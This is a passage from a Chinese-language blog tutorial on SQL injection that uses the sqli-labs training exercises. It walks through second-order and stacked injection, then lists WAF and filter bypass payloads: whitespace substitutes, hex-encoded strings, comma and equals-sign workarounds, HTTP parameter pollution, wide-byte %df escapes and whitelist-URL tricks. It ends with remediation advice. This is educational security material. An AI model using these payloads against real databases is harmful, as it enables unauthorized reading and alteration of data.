<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>​		sqli-labs Less-24</p>
<p>​		初始存在账密 admin 1：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/6.png"></p>
<p>​		我们的目的是将 admin 账户的密码改为 hacker 。</p>
<p>​		首先注册账户 admin’# hack：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/7.png"></p>
<p>​		之后登录 admin’# 账户，修改其密码为 hacker ，那么执行的 SQL 语句将为 <code>update xxx set password=&#39;hacher&#39; where username=&#39;admin&#39;#&#39;</code> ，即实际修改的是账户 admin 的密码：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/8.png"></p>
<p>​		可以发现账户 admin 的密码已修改为 hacker 。</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>​		堆叠注入，就是一次执行多条 SQL 语句。</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/10.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `student` WHERE STUDENTID=&#x27;2101010101&#x27;;</span><br><span class="line">DELETE FROM `student` WHERE STUDENTID=&#x27;2102020202&#x27;;</span><br></pre></td></tr></table></figure>

<p>​		多条 SQL 语句一起执行时只显示第一条的结果，但所有的都会执行：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/12.png"></p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/11.png"></p>
<p>​		堆叠注入跟联合注入很像，但联合注入只能 union select ，而堆叠注入 select、update、delete、insert 都可以，操作空间更大。</p>
<p>​		堆叠注入一般用于插入或修改账密。</p>
<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="过滤–-、"><a href="#过滤–-、" class="headerlink" title="过滤–+、#"></a>过滤–+、#</h2><p>​		例如闭合方式为 ‘$id’ ，则 <code>?id=-1&#39; union select 1,database(),&#39;2</code> 。</p>
<h2 id="过滤and、or"><a href="#过滤and、or" class="headerlink" title="过滤and、or"></a>过滤and、or</h2><ul>
<li>大小写变形</li>
<li>利用运算符替换：or → ||、and → &amp;&amp;</li>
</ul>
<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><ul>
<li>%09 TAB键（水平）</li>
<li>%20 空格</li>
<li>%a0 空白</li>
<li>%0a 换行符</li>
<li>%0b TAB键（垂直）</li>
<li>%0c 新的一页</li>
<li>%0d return功能</li>
<li>&#x2F;**&#x2F;</li>
<li>&#x2F;!&#x2F;</li>
</ul>
<h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p>​		转为进制，如 16 进制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;users&#x27;</span><br><span class="line">==&gt;</span><br><span class="line">select * from users where username=0x7573657273</span><br></pre></td></tr></table></figure>

<h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><ul>
<li><p>对于substr()、mid() 可以用 from to 代替：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line"></span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 join 代替：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2--+</span><br><span class="line">&lt;==&gt;</span><br><span class="line">union select * from (select 1)a join (select 2)b--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 like 代替：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80--+</span><br><span class="line">&lt;==&gt;</span><br><span class="line">select user() like &#x27;r%&#x27;--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于 limit 可以使用 offset 来绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1--+</span><br><span class="line">&lt;==&gt;</span><br><span class="line">select * from news limit 1 offset 0--+</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="过滤比较符号"><a href="#过滤比较符号" class="headerlink" title="过滤比较符号"></a>过滤比较符号</h2><p>​		使用 greatest()、least() 绕过，前者返回最大值，后者返回最小值。</p>
<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤&#x3D;"></a>过滤&#x3D;</h2><p>​		使用 like 、rlike（regexp的同义词） 、regexp 绕过。</p>
<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
<li>URL编码：# → %23</li>
<li>Hex编码：~ → 0x7e</li>
</ul>
<h2 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h2><p>​		HTTP Parameter Pollution ，HTTP 参数污染。注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入，即 <code>?id=1&amp;id=xxx</code> 。示例：sqli-labs Less-29 。</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>​		首先我们来了解以下 url 编码的规则：url 编码就是 % 加一个字符 ASCII 码的十六进制。</p>
<p>​		其次：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/9.png"></p>
<p>​		以 sqli-labs Less-32 为例，我们发现输入 ?id&#x3D;1’ 时，后端将处理成 1\‘ ，即添加转义字符将注入点转义防止 SQL 注入。在一般情况下，此处是不存在 SQL 注入漏洞的，但当 MySQL 为 GBK 编码时，可以使用宽字节注入。</p>
<p>​		宽字节编码是指不是像 ASCII 一样一个字符只占一个字节，如在 GBK 中一个汉字占两个字节。宽字节注入是利用 MySQL 的一个特性，即 MySQL 在使用 GBK 编码时，会认为两个字符是一个汉字（但需要前一个字符的ASCII码要大于127，才到汉字的范围）。</p>
<p>​		GET 型宽字节注入的格式是在输入内容后加一个 %df，即如 <code>?id=1%df&#39;</code> ，到达 SQL 语句中时处理为 id&#x3D;1�\‘ （因为ASCII中不存在16进制为df的字符，所以暂时转换为� ）。当 GBK 编码的 MySQL 识别  id&#x3D;1�\‘ 时，因为 �（即16进制数df）大于 127 ，将被识别为汉字的第一个字节，而 \ 的 ASCII 码的 16 进制为 5c ，df5c 在 GBK 编码中是繁体字“運”，这样注入信息最终变成 id&#x3D;1運’ ，转义符号 \ 被吞噬，单引号成功逃逸。</p>
<p>​		POST 型宽字节注入则需要抓包自己加上 16 进制为 df 的”字符“。</p>
<h2 id="静态资源请求"><a href="#静态资源请求" class="headerlink" title="静态资源请求"></a>静态资源请求</h2><p>​		特定的静态资源后缀请求。类似白名单机制，waf 为了提高检测效率，会直接放弃检测这样一些静态文件名后缀的请求。</p>
<p>​		常见的静态文件：.js、.jpg、.swf、.css 等。</p>
<p>​		注：aspx&#x2F;php 只识别到前面的 .aspx&#x2F;.php，后面的基本不识别。</p>
<p>​		<img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/15.png"></p>
<h2 id="URL白名单"><a href="#URL白名单" class="headerlink" title="URL白名单"></a>URL白名单</h2><p>​		为防止误拦，部分 waf 内置默认的白名单列表，如 admin.php、&#x2F;admin&#x2F;、&#x2F;system&#x2F;、&#x2F;manager&#x2F; 及相关组合，用于后台管理等。只要 url 中存在白名单字符串，就不会对其进行检测。如：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/16.png"></p>
<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol>
<li>针对客户端传入的内容，过滤一些 SQL 关键字，比如 select 、insert ，以及反引号 、引号、– 这一类保留字符。当然因为各种编码和绕过技术，手工进行过滤是不够的，容易遗漏，比较安全的方式是采用编程语言预置的功能，例如，用 Java 的 PreparedStatment 进行 SQL 操作。当然，现在还有很多框架类的数据操作工具，如常见的数据库持久化框架，都会自动完成对相关数据的过滤和校验。</li>
<li>不要使用字符串拼接的方式进行 SQL 语句的组装和操作。 </li>
<li>不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li>
<li>不要把机密信息直接存放，先加密处理。</li>
<li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装。</li>
<li>对传入的特殊字符进行转义。</li>
</ol>
</article><div class="tag_share"><div class="post_share"></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93"><span class="toc-number">1.1.1.</span> <span class="toc-text">–+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#select-1-database"><span class="toc-number">1.1.2.</span> <span class="toc-text">select 1, database()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E3%80%81%E6%8B%AC%E5%8F%B7%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.3.</span> <span class="toc-text">引号、括号问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text">一些函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.1.5.</span> <span class="toc-text">一些语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#information-schema%E5%BA%93%E4%B8%89%E8%A1%A8"><span class="toc-number">1.1.6.</span> <span class="toc-text">information_schema库三表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E6%8E%A8%E7%90%86"><span class="toc-number">1.2.2.</span> <span class="toc-text">闭合推理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">爆语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">爆字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.1.3.</span> <span class="toc-text">爆回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E5%90%8D"><span class="toc-number">2.1.4.</span> <span class="toc-text">爆库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">2.1.5.</span> <span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-number">2.1.6.</span> <span class="toc-text">爆列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%80%BC"><span class="toc-number">2.1.7.</span> <span class="toc-text">爆值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-number">2.2.1.</span> <span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml"><span class="toc-number">2.2.2.</span> <span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#floor"><span class="toc-number">2.2.3.</span> <span class="toc-text">floor()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA"><span class="toc-number">2.2.4.</span> <span class="toc-text">数据溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E9%87%8D%E5%A4%8D"><span class="toc-number">2.2.5.</span> <span class="toc-text">查询重复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">布尔注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#id-1%E2%80%99-and-left-version-1-N%E2%80%93"><span class="toc-number">2.3.1.</span> <span class="toc-text">?id&#x3D;1’ and left(@@version,1)&#x3D;N–+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#id-1%E2%80%99-and-length-database-N%E2%80%93"><span class="toc-number">2.3.2.</span> <span class="toc-text">?id&#x3D;1’ and length(database())&#x3D;N–+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#id-1%E2%80%99-and-left-database-1-%E2%80%99a%E2%80%99%E2%80%93-%E3%80%81-id-1%E2%80%99-and-left-database-2-%E2%80%99sa%E2%80%99%E2%80%93"><span class="toc-number">2.3.3.</span> <span class="toc-text">?id&#x3D;1’ and left(database(),1)&gt;’a’–+、?id&#x3D;1’ and left(database(),2)&gt;’sa’–+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#id-1%E2%80%99-and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-M-1-N-1-101"><span class="toc-number">2.3.4.</span> <span class="toc-text">?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit M,1),N,1))&#x3D;101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#id-1%E2%80%99-and-1-select-1-from-information-schema-columns-where-table-schema-%E2%80%99xxx%E2%80%99-and-table-name-regexp-%E2%80%98xxx%E2%80%99-limit-N-1-%E2%80%93"><span class="toc-number">2.3.5.</span> <span class="toc-text">?id&#x3D;1’ and 1&#x3D;(select 1 from information_schema.columns where table_schema&#x3D;’xxx’ and table_name regexp ‘xxx’ limit N,1)–+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#id-1%E2%80%99-and-ord-mid-select-ifnull-cast-username-as-char-0x20-from-security-users-order-by-id-limit-M-1-N-1-68%E2%80%93"><span class="toc-number">2.3.6.</span> <span class="toc-text">?id&#x3D;1’ and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit M,1),N,1))&#x3D;68–+</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.</span> <span class="toc-text">导出文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="toc-number">2.5.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">2.5.2.</span> <span class="toc-text">操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">DNSlog注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UNC%E8%B7%AF%E5%BE%84"><span class="toc-number">2.6.1.</span> <span class="toc-text">UNC路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95"><span class="toc-number">2.6.2.</span> <span class="toc-text">操作方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.7.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="toc-number">2.7.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.7.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.8.</span> <span class="toc-text">堆叠注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E2%80%93-%E3%80%81"><span class="toc-number">3.1.</span> <span class="toc-text">过滤–+、#</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4and%E3%80%81or"><span class="toc-number">3.2.</span> <span class="toc-text">过滤and、or</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">3.3.</span> <span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="toc-number">3.4.</span> <span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="toc-number">3.5.</span> <span class="toc-text">过滤逗号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7"><span class="toc-number">3.6.</span> <span class="toc-text">过滤比较符号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">3.7.</span> <span class="toc-text">过滤&#x3D;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HPP"><span class="toc-number">3.9.</span> <span class="toc-text">HPP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.10.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82"><span class="toc-number">3.11.</span> <span class="toc-text">静态资源请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">3.12.</span> <span class="toc-text">URL白名单</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.</span> <span class="toc-text">修复</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mars1y</div><div class="footer_custom_text">To be continued.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/yituliu.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>